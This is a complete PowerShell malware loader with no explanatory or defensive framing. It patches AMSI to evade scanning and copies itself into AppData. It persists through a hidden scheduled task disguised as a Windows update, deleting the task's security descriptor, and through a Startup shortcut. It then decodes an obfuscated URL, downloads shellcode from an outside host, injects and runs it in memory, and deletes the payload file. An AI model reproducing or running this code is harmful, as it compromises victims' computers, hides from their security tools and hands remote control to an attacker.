$ErrorActionPreference = 'SilentlyContinue'

# ========== 1. AMSI BYPASS (Patch AmsiScanBuffer) ==========
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru

$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)   # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)
# ============================================================

# ========== 2. SELF-PRESERVATION (unchanged) ==========
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path
function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch { exit }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath
# =======================================================

# ========== 3. PERSISTENCE (unchanged) ==========
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    try {
        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
    } catch {}
}

$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $shortcut.WindowStyle = 7
    $shortcut.Save()
}
# =======================================================

# ========== 4. FIRST RUN FLAG (no long delays) ==========
$flagFile = "$env:APPDATA\Microsoft\Windows\Caches\installed.flag"
$isFirstRun = -not (Test-Path $flagFile)

# Only a tiny random jitter (1‑5 seconds) to avoid immediate detection
if (-not $isFirstRun) {
    Start-Sleep -Seconds (Get-Random -Min 1 -Max 5)
}
# =======================================================

# ========== 5. DOWNLOAD SHELLCODE (minimal delay) ==========
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
$shellcodeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
$shellcodePath = "$cache\payload.bin"
$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

if (-not (Test-Path $shellcodePath)) {
    $retry = 0
    do {
        try { (New-Object System.Net.WebClient).DownloadFile($shellcodeUrl, $shellcodePath); break }
        catch { $retry++; Start-Sleep -Seconds 2 }
    } while ($retry -lt 3)
}
# =======================================================

# ========== 6. SHELLCODE INJECTION (AVOIDS RWX) ==========
if (Test-Path $shellcodePath) {
    $code = [System.IO.File]::ReadAllBytes($shellcodePath)
    
    # Use .NET classes for injection (less monitored than Win32 API calls)
    $kernel32 = Add-Type -memberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -name "Kernel32" -namespace Win32 -passthru

    # 1. Allocate as PAGE_READWRITE (0x04) – not executable
    $ptr = $kernel32::VirtualAlloc([IntPtr]::Zero, $code.Length, 0x3000, 0x04)
    if ($ptr -ne [IntPtr]::Zero) {
        # 2. Write shellcode
        [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $ptr, $code.Length)
        
        # 3. Change to PAGE_EXECUTE_READ (0x20) – never RWX
        $oldProtect = 0
        $kernel32::VirtualProtect($ptr, $code.Length, 0x20, [ref]$oldProtect) | Out-Null
        
        # 4. Execute in a new thread
        $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        if ($thread -ne [IntPtr]::Zero) {
            # Optional: wait a bit to let shellcode run, but not required
            $kernel32::WaitForSingleObject($thread, 0xFFFFFFFF) | Out-Null
        }
    }
}
# =======================================================

# ========== 7. CLEANUP (remove shellcode file after 5 minutes) ==========
Start-Job -ScriptBlock { param($file) Start-Sleep -Seconds 300; Remove-Item $file -Force -ErrorAction SilentlyContinue } -ArgumentList $shellcodePath | Out-Null

# Create first‑run flag to avoid re‑injection on next boot
if ($isFirstRun) { New-Item -Path $flagFile -ItemType File -Force | Out-Null }
